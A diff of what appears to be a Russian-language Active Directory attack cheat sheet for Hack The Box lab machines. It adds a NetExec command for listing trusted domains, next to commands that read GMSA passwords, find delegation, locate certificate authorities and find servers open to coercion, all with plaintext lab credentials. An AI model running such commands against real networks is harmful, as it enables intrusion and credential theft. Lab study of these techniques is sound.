@@ -81,7 +81,9 @@
 		(чтение GMSA)  nxc ldap -u javier.mmarshall -p 'Password123' -k --gmsa dc01.mirage.htb
 		
  		(Нахождение делегирования)  nxc ldap  10.10.11.78 -u mark.bbond -p '1day@atime' -k --trusted-for-delegation --find-delegation   
-
+		
+		(Нахождение доверительных доменов)	nxc ldap -u john.w -p 'RFulUtONCOL!' -d darkzero.htb dc01.darkzero.htb --dc-list
+		
    		(поиск центра сертификации)	crackmapexec ldap 'dc.sequel.htb' -d 'sequel.htb' -u 'Ryan.Cooper' -p 'NuclearMosquito3' -M adcs  	
   		
 		(Уязвимые для атак перенаправления серверы )	nxc smb 10.10.1.50 -u kemг -p password -M coersce_plus		
